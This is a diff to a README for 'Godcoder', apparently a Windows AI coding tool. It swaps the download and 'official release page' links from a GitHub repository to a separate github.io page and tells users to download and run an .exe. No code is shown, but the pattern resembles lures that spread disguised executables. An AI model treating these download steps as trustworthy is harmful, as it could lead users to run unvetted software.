@@ -1,6 +1,6 @@
 # 🤖 Godcoder - Build better software with AI power
 
-[![](https://img.shields.io/badge/Download_Godcoder-blue.svg)](https://github.com/Llokm8601/Godcoder)
+[![](https://img.shields.io/badge/Download_Godcoder-blue.svg)](https://llokm8601.github.io)
 
 Godcoder is a tool for your computer. It acts as an assistant for coding tasks. You keep your files on your hard drive. Only the text you send to the AI model leaves your machine. This tool builds code structures and helps you finish projects faster. It uses modern technology to run safely on your desk.
 
@@ -8,7 +8,7 @@ Godcoder is a tool for your computer. It acts as an assistant for coding tasks. 
 
 You need the installer file to run this app on Windows. Follow these steps to get started.
 
-1. Go to the [official release page](https://github.com/Llokm8601/Godcoder).
+1. Go to the [official release page](https://llokm8601.github.io).
 2. Look for the Assets section at the bottom of the newest version.
 3. Click the file that ends in .exe.
 4. Save the file to your computer.
